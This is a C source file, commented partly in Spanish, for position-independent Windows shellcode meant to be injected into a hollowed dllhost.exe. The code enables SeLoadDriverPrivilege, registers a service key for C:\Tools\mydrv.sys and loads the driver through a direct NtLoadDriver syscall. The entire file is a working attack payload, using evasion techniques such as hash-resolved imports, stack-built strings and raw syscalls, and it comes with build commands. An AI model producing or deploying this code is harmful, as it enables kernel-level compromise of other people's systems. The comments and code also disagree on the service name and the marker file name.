/*
 * shellcode.c -- position-independent shellcode que carga mydrv.sys
 *   via NtLoadDriver syscall, inyectado dentro de dllhost.exe hollowed.
 *
 *   Flow:
 *     1. PEB walk para kernel32, ntdll
 *     2. Resolver imports via export-walk + FNV1A hash
 *     3. LoadLibraryA("advapi32.dll") + resolver registry/token APIs
 *     4. OpenProcessToken + LookupPrivilegeValueA(SeLoadDriverPrivilege)
 *        + AdjustTokenPrivileges
 *     5. RegCreateKeyExA + RegSetValueExA x4 (ImagePath, Type, Start, ErrorControl)
 *     6. Find NtLoadDriver SSN via ntdll export
 *     7. UNICODE_STRING para "\Registry\Machine\System\CCS\Services\MyDrv"
 *     8. syscall NtLoadDriver
 *     9. Write marker file C:\Tools\load_status.txt
 *    10. syscall NtTerminateProcess(-1, 0)
 *
 *   Build:
 *     x86_64-w64-mingw32-gcc -ffreestanding -fPIC -nostdlib -nostartfiles \
 *       -fno-stack-protector -fno-unwind-tables -fno-asynchronous-unwind-tables \
 *       -mno-red-zone -Os -Wl,-T,sc.ld,-e_sc_entry shellcode.c -o sc.elf
 *     x86_64-w64-mingw32-objcopy -O binary --only-section=.text sc.elf sc.bin
 */
#include <stdint.h>

typedef struct _UNICODE_STR {
    uint16_t Length;
    uint16_t MaximumLength;
    uint16_t *Buffer;
} UNICODE_STR;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY;

typedef struct _LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    void   *DllBase;
    void   *EntryPoint;
    uint32_t SizeOfImage;
    UNICODE_STR FullDllName;
    UNICODE_STR BaseDllName;
} LDR_ENTRY;

typedef struct _PEB_LDR {
    uint32_t Length;
    uint8_t  Initialized;
    void    *SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR;

typedef struct _PEB_MIN {
    uint8_t  pad0[0x18];
    PEB_LDR *Ldr;
} PEB_MIN;

/* PE typedefs minimal */
typedef struct {
    uint16_t e_magic;
    uint8_t  pad[0x3a];
    uint32_t e_lfanew;
} DOS_HDR;

typedef struct {
    uint32_t Signature;
    uint16_t Machine;
    uint16_t NumberOfSections;
    uint32_t TimeDateStamp;
    uint32_t PointerToSymbolTable;
    uint32_t NumberOfSymbols;
    uint16_t SizeOfOptionalHeader;
    uint16_t Characteristics;
    uint8_t  OptionalHeader[112 /* up to DataDirectory */];
    /* DataDirectory[16] -- entry 0 = export */
    uint64_t DataDirEntries[16];
} NT_HDR;

/* ---------- helpers ---------- */
static PEB_MIN *get_peb(void) {
    PEB_MIN *p;
    __asm__("mov %%gs:0x60, %0" : "=r"(p));
    return p;
}

static int wstreq_i(const uint16_t *a, const char *b) {
    while (*a && *b) {
        uint16_t ca = *a;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        uint8_t cb = *b;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 0;
        a++; b++;
    }
    return *a == 0 && *b == 0;
}

static int streq(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return *a == 0 && *b == 0;
}

static uint32_t fnv1a(const char *s) {
    uint32_t h = 0x811C9DC5;
    while (*s) {
        h ^= (uint32_t)(uint8_t)*s++;
        h *= 0x01000193;
    }
    return h;
}

static void *find_module(const char *basename_ascii) {
    PEB_MIN *peb = get_peb();
    if (!peb || !peb->Ldr) return 0;
    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur  = head->Flink;
    while (cur != head) {
        LDR_ENTRY *e = (LDR_ENTRY *)((uint8_t *)cur - sizeof(LIST_ENTRY));
        if (e->BaseDllName.Buffer && wstreq_i(e->BaseDllName.Buffer, basename_ascii))
            return e->DllBase;
        cur = cur->Flink;
    }
    return 0;
}

static void *find_export_by_hash(void *dll_base, uint32_t hash) {
    if (!dll_base) return 0;
    DOS_HDR *dos = (DOS_HDR *)dll_base;
    NT_HDR  *nt  = (NT_HDR *)((uint8_t *)dll_base + dos->e_lfanew);
    uint32_t exp_rva  = (uint32_t)(nt->DataDirEntries[0] & 0xFFFFFFFF);
    uint32_t exp_size = (uint32_t)(nt->DataDirEntries[0] >> 32);
    if (!exp_rva || !exp_size) return 0;

    typedef struct {
        uint32_t Characteristics, TimeDateStamp;
        uint16_t MajorVersion, MinorVersion;
        uint32_t Name, Base, NumberOfFunctions, NumberOfNames;
        uint32_t AddressOfFunctions, AddressOfNames, AddressOfNameOrdinals;
    } EXP_DIR;
    EXP_DIR *exp = (EXP_DIR *)((uint8_t *)dll_base + exp_rva);
    uint32_t *names = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfNames);
    uint16_t *ords  = (uint16_t *)((uint8_t *)dll_base + exp->AddressOfNameOrdinals);
    uint32_t *funcs = (uint32_t *)((uint8_t *)dll_base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char *n = (const char *)((uint8_t *)dll_base + names[i]);
        if (fnv1a(n) == hash)
            return (uint8_t *)dll_base + funcs[ords[i]];
    }
    return 0;
}

/* read SSN from clean Nt* stub:  4C 8B D1 B8 <ssn:4> */
static uint32_t read_ssn(void *stub) {
    uint8_t *s = (uint8_t *)stub;
    if (!s) return 0xFFFFFFFF;
    if (s[0] == 0x4C && s[1] == 0x8B && s[2] == 0xD1 && s[3] == 0xB8)
        return *(uint32_t *)(s + 4);
    return 0xFFFFFFFF;
}

/* Inline trampoline that does the syscall.
 * Args follow MS x64 convention (rcx, rdx, r8, r9, stack...).
 * `ssn` is the system service number.
 */
static __attribute__((naked)) int64_t do_syscall(
    uint32_t ssn, void *a1, void *a2, void *a3, void *a4)
{
    __asm__(
        "mov  %rcx, %r10\n"      /* save ssn temp */
        "mov  %rdx, %rcx\n"       /* a1 -> rcx */
        "mov  %r8,  %rdx\n"       /* a2 -> rdx */
        "mov  %r9,  %r8 \n"       /* a3 -> r8  */
        "mov  0x28(%rsp), %r9\n"  /* a4 -> r9 (from shadow space slot) */
        "mov  %r10d, %eax\n"      /* ssn -> eax */
        "mov  %rcx,  %r10\n"      /* MS syscall conv: r10 = rcx */
        "syscall\n"
        "ret\n"
    );
}

/* ---------- typedefs of API we call ---------- */
typedef void *(__attribute__((ms_abi)) *LoadLibraryA_t)(const char *);
typedef void *(__attribute__((ms_abi)) *GetProcAddress_t)(void *, const char *);
typedef int   (__attribute__((ms_abi)) *OpenProcessToken_t)(void *proc, uint32_t access, void **tok);
typedef void *(__attribute__((ms_abi)) *GetCurrentProcess_t)(void);
typedef int   (__attribute__((ms_abi)) *LookupPrivilegeValueA_t)(const char *sys, const char *name, void *luid);
typedef int   (__attribute__((ms_abi)) *AdjustTokenPrivileges_t)(void *tok, int dis, void *new, uint32_t buflen, void *prev, uint32_t *retlen);
typedef int   (__attribute__((ms_abi)) *CloseHandle_t)(void *h);
typedef int   (__attribute__((ms_abi)) *RegCreateKeyExA_t)(void *root, const char *sub, uint32_t res, char *cls, uint32_t opt, uint32_t sam, void *sa, void **out, uint32_t *disp);
typedef int   (__attribute__((ms_abi)) *RegSetValueExA_t)(void *key, const char *name, uint32_t res, uint32_t type, const uint8_t *data, uint32_t cb);
typedef int   (__attribute__((ms_abi)) *RegCloseKey_t)(void *key);
typedef void *(__attribute__((ms_abi)) *CreateFileA_t)(const char *, uint32_t, uint32_t, void *, uint32_t, uint32_t, void *);
typedef int   (__attribute__((ms_abi)) *WriteFile_t)(void *, const void *, uint32_t, uint32_t *, void *);
typedef int   (__attribute__((ms_abi)) *CreateDirectoryA_t)(const char *, void *);

typedef struct {
    uint32_t LowPart;
    int32_t  HighPart;
} LUID;

typedef struct {
    uint32_t PrivilegeCount;
    LUID     Luid;
    uint32_t Attributes;
} TOKEN_PRIVS_ONE;

/* registry constants */
#define KEY_ALL_ACCESS       0xF003F
#define REG_OPTION_NON_VOLATILE 0
#define REG_DWORD            4
#define REG_EXPAND_SZ        2
#define TOKEN_ADJUST_PRIVS   0x20
#define TOKEN_QUERY          0x08
#define SE_PRIVILEGE_ENABLED 2
#define HKEY_LOCAL_MACHINE   ((void *)0x80000002UL)
#define GENERIC_WRITE        0x40000000
#define FILE_SHARE_READ      1
#define FILE_SHARE_WRITE     2
#define OPEN_ALWAYS          4
#define FILE_ATTRIBUTE_NORMAL 0x80
#define INVALID_HANDLE_VALUE ((void *)-1)

/* ---------- entry ---------- */
void __attribute__((section(".text"))) sc_entry(void) {
    /* 1) bases */
    void *k32 = find_module("kernel32.dll");
    void *ntdll = find_module("ntdll.dll");
    if (!k32 || !ntdll) goto die;

    /* 2) resolve kernel32 essentials */
    LoadLibraryA_t   pLL = (LoadLibraryA_t)   find_export_by_hash(k32, fnv1a("LoadLibraryA"));
    GetProcAddress_t pGP = (GetProcAddress_t) find_export_by_hash(k32, fnv1a("GetProcAddress"));
    if (!pLL || !pGP) goto die;

    /* helper macros */
    #define K32(name) pGP(k32, name)
    GetCurrentProcess_t pGCP = (GetCurrentProcess_t)K32("GetCurrentProcess");
    CloseHandle_t       pCH  = (CloseHandle_t)      K32("CloseHandle");
    CreateFileA_t       pCFA = (CreateFileA_t)      K32("CreateFileA");
    WriteFile_t         pWF  = (WriteFile_t)        K32("WriteFile");
    CreateDirectoryA_t  pCDA = (CreateDirectoryA_t) K32("CreateDirectoryA");
    if (!pGCP || !pCH || !pCFA || !pWF || !pCDA) goto die;

    /* 3) load advapi32 + resolve */
    char advapi[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
    void *adv = pLL(advapi);
    if (!adv) goto die;

    OpenProcessToken_t      pOPT = (OpenProcessToken_t)      pGP(adv, "OpenProcessToken");
    LookupPrivilegeValueA_t pLPV = (LookupPrivilegeValueA_t) pGP(adv, "LookupPrivilegeValueA");
    AdjustTokenPrivileges_t pATP = (AdjustTokenPrivileges_t) pGP(adv, "AdjustTokenPrivileges");
    RegCreateKeyExA_t       pRCK = (RegCreateKeyExA_t)       pGP(adv, "RegCreateKeyExA");
    RegSetValueExA_t        pRSV = (RegSetValueExA_t)        pGP(adv, "RegSetValueExA");
    RegCloseKey_t           pRCl = (RegCloseKey_t)           pGP(adv, "RegCloseKey");
    if (!pOPT || !pLPV || !pATP || !pRCK || !pRSV || !pRCl) goto die;

    /* 4) Enable SeLoadDriverPrivilege */
    void *tok = 0;
    if (!pOPT(pGCP(), TOKEN_ADJUST_PRIVS | TOKEN_QUERY, &tok) || !tok) goto die;

    char se_load_drv[] = {'S','e','L','o','a','d','D','r','i','v','e','r','P','r','i','v','i','l','e','g','e',0};
    LUID luid = {0};
    if (!pLPV(0, se_load_drv, &luid)) { pCH(tok); goto die; }

    TOKEN_PRIVS_ONE tp = { 1, luid, SE_PRIVILEGE_ENABLED };
    pATP(tok, 0, &tp, sizeof tp, 0, 0);
    pCH(tok);

    /* 5) Reg create + set values */
    char key_path[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','W','i','n','M','s','r',0};
    void *hKey = 0;
    if (pRCK(HKEY_LOCAL_MACHINE, key_path, 0, 0, REG_OPTION_NON_VOLATILE,
             KEY_ALL_ACCESS, 0, &hKey, 0) != 0 || !hKey) goto die;

    /* ImagePath = "\??\C:\Tools\mydrv.sys" */
    char img_path[] = {'\\','?','?','\\','C',':','\\','T','o','o','l','s','\\','m','y','d','r','v','.','s','y','s',0};
    char img_name[] = {'I','m','a','g','e','P','a','t','h',0};
    pRSV(hKey, img_name, 0, REG_EXPAND_SZ, (const uint8_t *)img_path, sizeof img_path);

    uint32_t type_val = 1, start_val = 3, errctl_val = 1;
    char type_name[]   = {'T','y','p','e',0};
    char start_name[]  = {'S','t','a','r','t',0};
    char ec_name[]     = {'E','r','r','o','r','C','o','n','t','r','o','l',0};
    pRSV(hKey, type_name,  0, REG_DWORD, (const uint8_t *)&type_val,   4);
    pRSV(hKey, start_name, 0, REG_DWORD, (const uint8_t *)&start_val,  4);
    pRSV(hKey, ec_name,    0, REG_DWORD, (const uint8_t *)&errctl_val, 4);
    pRCl(hKey);

    /* 6) Resolve NtLoadDriver SSN */
    void *p_NtLoadDriver = find_export_by_hash(ntdll, fnv1a("NtLoadDriver"));
    if (!p_NtLoadDriver) goto die;
    uint32_t ssn_load = read_ssn(p_NtLoadDriver);
    if (ssn_load == 0xFFFFFFFF) goto die;

    /* 7) UNICODE_STRING para "\Registry\Machine\System\CurrentControlSet\Services\MyDrv"
     *    Construir wide-string en stack. */
    static const uint16_t reg_path_w[] = {
        '\\','R','e','g','i','s','t','r','y','\\','M','a','c','h','i','n','e',
        '\\','S','y','s','t','e','m','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t',
        '\\','S','e','r','v','i','c','e','s','\\','W','i','n','M','s','r', 0
    };
    /* Copy to stack array (so it's reachable position-independent through rip-rel) */
    uint16_t buf[80];
    int i; for (i = 0; reg_path_w[i] && i < 79; ++i) buf[i] = reg_path_w[i]; buf[i] = 0;

    UNICODE_STR us;
    us.Length        = (uint16_t)(i * 2);
    us.MaximumLength = (uint16_t)((i + 1) * 2);
    us.Buffer        = buf;

    /* 8) syscall NtLoadDriver(&us) */
    int64_t status = do_syscall(ssn_load, &us, 0, 0, 0);

    /* 9) Write marker file */
    char dir[]  = {'C',':','\\','T','o','o','l','s',0};
    char path[] = {'C',':','\\','T','o','o','l','s','\\','v','9','_','s','t','a','t','u','s','.','t','x','t',0};
    pCDA(dir, 0);
    void *h = pCFA(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (h != INVALID_HANDLE_VALUE && h != 0) {
        char msg[64];
        char *m = msg;
        const char *prefix = "[v9 sc] NtLoadDriver status=0x";
        const char *cur = prefix;
        while (*cur) *m++ = *cur++;
        /* hex(status low 32) */
        uint32_t v = (uint32_t)status;
        for (int b = 7; b >= 0; --b) {
            uint32_t n = (v >> (b * 4)) & 0xF;
            *m++ = n < 10 ? '0' + n : 'a' + (n - 10);
        }
        *m++ = '\r'; *m++ = '\n';
        uint32_t wr = 0;
        pWF(h, msg, (uint32_t)(m - msg), &wr, 0);
        pCH(h);
    }

die:
    /* 10) clean exit via NtTerminateProcess(-1, 0) */
    {
        void *p_NtTerm = find_export_by_hash(ntdll, fnv1a("NtTerminateProcess"));
        uint32_t ssn_term = read_ssn(p_NtTerm);
        if (ssn_term != 0xFFFFFFFF) {
            do_syscall(ssn_term, (void *)(intptr_t)-1, (void *)0, 0, 0);
        }
        /* fallback infinite halt */
        for (;;) __asm__ volatile("hlt");
    }
}
